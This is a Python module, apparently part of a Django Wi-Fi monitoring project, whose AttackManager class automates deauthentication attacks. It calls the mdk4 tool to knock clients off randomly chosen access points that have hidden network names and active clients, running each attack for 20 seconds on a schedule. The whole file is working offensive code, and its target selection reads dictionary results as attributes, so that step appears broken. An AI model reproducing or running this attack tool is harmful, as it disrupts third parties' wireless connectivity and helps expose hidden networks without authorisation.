# -*- coding: utf-8 -*-
import importlib
# import os
# import signal
import sys
import time
import traceback
import subprocess
import random
import logging

from wifiINFO.models import Activelog
from wifiINFO.common import settings as configer

logger = logging.getLogger("wifiINFO.attack")
importlib.reload(sys)


class AttackManager(object):
    def __init__(self):
        self.config = configer.ConfigManager()
        self.ATKFACE = None

    def start_cron(self):
        self.config.set(ATK_STATUS=True)
        self.ATKFACE = self.config.get('ATKFACE')

    def stop_cron(self):
        self.config.set(ATK_STATUS=False)

    # def stop(self):
    #     try:
    #         ATK_PID = self.config.get('ATK_PID')
    #
    #         os.kill(ATK_PID, signal.SIGKILL)
    #
    #         self.config.set(ATK_PID=None)
    #     except RuntimeError:
    #         print('\n', '>>>' * 20)
    #         print(traceback.print_exc())
    #         print('\n', '>>>' * 20)
    #         print(traceback.format_exc())

    def deauth(self, bssid, channel):
        # Deauth
        try:
            process = subprocess.Popen([
                "mdk4",
                self.ATKFACE,
                "d",
                "-s",
                "20",
                "-c",
                channel,
                "-B",
                bssid
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            self.config.set(ATK_PID=process.pid)
            return process

        except Exception as e:
            print(e)
            return False

    def cron_atk(self):
        if self.config.get('MAIN_STATUS') is False:
            return False

        if self.config.get('ATK_STATUS') is False:
            return False

        target = self.random_target()
        process = self.deauth(target.bssid, target.channel)
        time.sleep(20)

        try:
            process.kill()
        except RuntimeError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())

    @staticmethod
    def random_target():
        try:
            no_essid_ap = Activelog.objects.filter(essid__isnull=True, client__isnull=False).values('bssid', 'channel')
            target = random.choice(no_essid_ap)

        except ConnectionError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False
        return target
